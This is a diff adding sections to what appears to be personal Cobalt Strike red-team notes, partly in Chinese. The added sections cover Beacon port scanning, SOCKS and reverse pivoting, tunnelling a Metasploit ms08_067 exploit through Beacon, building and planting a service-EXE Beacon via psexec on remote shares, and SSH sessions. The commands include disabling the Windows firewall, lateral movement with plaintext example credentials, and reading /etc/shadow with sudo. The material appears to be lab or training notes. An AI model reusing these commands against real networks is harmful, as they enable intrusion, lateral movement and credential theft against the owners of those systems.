@@ -302,6 +302,94 @@ __Credentials and Hashes__
   * `mimikatz !lasdump::sam` for local
 * `View -> Credentials` to manage
 
+
+### Port Scanning
+右击 Session - `Explore - Port Scan` 或
+* Beacon has a port scanner for target discovery
+  * `portscan <hosts> [ports] [discover] [max]`
+* Arguments:
+  * `hosts` is a range of targets `192.168.1.0/24,172.16.4.25-172.16.4.100`
+  * `ports` is a range of ports to scan `1-1024,5900,8000-9000`
+  * `discover` is the method to check if a host is alive.  `arp,icmp`,or `none`.
+  * `max` is the maximum number of sockets open at once `4` for Windows XP is OK,`1024` for Windows 7 and later
+
+```sh
+beacon > make token CORP\Administrator password1234!  
+beacon > jump psexec64 POWERDC local - smb
+```
+### Pivoting through SOCKS
+* Tunnel Traffic
+  - Set up a SOCKS4a proxy server tunneling through the current Beacon
+  - `socks [port]`
+  - Use `socks stop` to kill the SOCKS proxy server.
+* `View - Proxy Pivots` to manage pivots.
+
+#### Tunnel Metasploit through Beacon
+* Force the Metasploit Framework to use your SOCKS proxy server for connections:
+  * `setg Proxies socks4:127.0.0.1:[port]`
+  * `setg ReverseAllowProxy true`
+* To stop pivoting in this way:
+  * `unsetg Proxies`
+
+msf
+```sh
+
+msf > use exploit/windows/smb/ms08_067_netapi
+msf > set PAYLOAD windows/meterpreter/bind_tcp
+msf > set RH0ST 192.168.58.205
+msf > setg Proxies socks4:127.0.0.1:1234
+msf > run -j
+
+msf > session -i 1
+meterpreter > sysinfo
+
+beacon > socks 2000
+
+vi /etc/proxychains.conf
+# socks4 127.0.0.1 2000
+proxychains rdesktop 10.10.10.5
+```
+
+#### Reverse Pivoting
+* Tunnel Traffic (Reverse)
+  * Make target listen on port and tunnel connection toanother system
+  * `rportfwd [listen port][forward host][forward port]`
+  * Use `rportfwd stop [listen port] to stop`
+* Make sure to account for firewall on target!
+### Pivot Listeners
+* Create a listener that calls home through a Beacon session...`(Asynchronous C2 is OK!)`
+  - `[beacon]` -> `Pivoting` -> `Listener`
+* Pivot - POWERDC
+
+![](https://s2.loli.net/2023/01/25/Nic4pXOhvb8yrnU.png)
+
+```sh
+POWERDC beacon > shell netstat -nao | findstr "4444"
+beacon > shell netsh advfirewall set allprofiles state off
+beacon > make_token POWER\Administrator waza1234! 
+beacon > ls \\192.168.50.205\C$
+beacon > jump psexec ENGINEER pivot - POWERDC
+beacon > jump psexec BILLING pivot - POWERDC
+```
+
+1. New Listener Name: `local - tcp(pivoting)`
+```
+Payload: Beacon TCP
+Port: 6667
+```
+2. Windows Executable(Stageless)
+```
+Listener: local - tcp(pivoting)
+Output: Windows Service EXE
+x64: √Use x64 Payload
+Filename: svcbeacon.exe
+```
+3. File Browser: 10.10.10.191@816 打开 `\\FILESERVER\C$\windows\temp` 上传 `svcbeacon.exe`
+4. `10.10.10.191@816 beacon > remote-exec psexec FILESERVER c:\windows\temp\svcbeacon.exe`
+5. `SSH 10.10.10.21 beacon > connect FILESERVER.corp.acme.com 6667`
+![](https://s2.loli.net/2023/01/26/WCGNib3OTuZQU6S.png)
+
+查看 Pivot： `Sesssion 右击 - Explore - Browser Pivot`
 ### Domain
 [Link](https://www.youtube.com/watch?v=QF_6zFLmLn0)
 
@@ -386,7 +474,27 @@ __Run an Artifact__
 | wir    | Run command via WinRM (PowerShell)               |
 
 beacon > 
+### SSH Sessions
+* Launch SSH session with credentials: 
+  - `ssh [target:port] [username] [password]`
+* Launch SSH session with key authentication: 
+  - `ssh-key [target:port] [username] [/path/key]`
+- Run a command
+  - `shell [command] [args]`
+- Run a command with sudo
+  - `sudo [password] [command] [args]`
+  - `sudo password1234 cat /etc/shadow`
+- Change folder
+  - `cd /path/`
+- Download and Upload files
+  - `upload [/local/file]`
+  - `download [file]`
+* Start SOCKS pivoting
+  - `socks 1234`
+* Reverse Port forward
+  - `rportfwd [listen port] [forward host] [forward port]`
 
+`rportfwd` does require that the SSH daemon's `GatewayPorts` option is set to `yes` or `ClientSpecified`.
 ## Plugins
 
 ### CrossC2/上线Linux
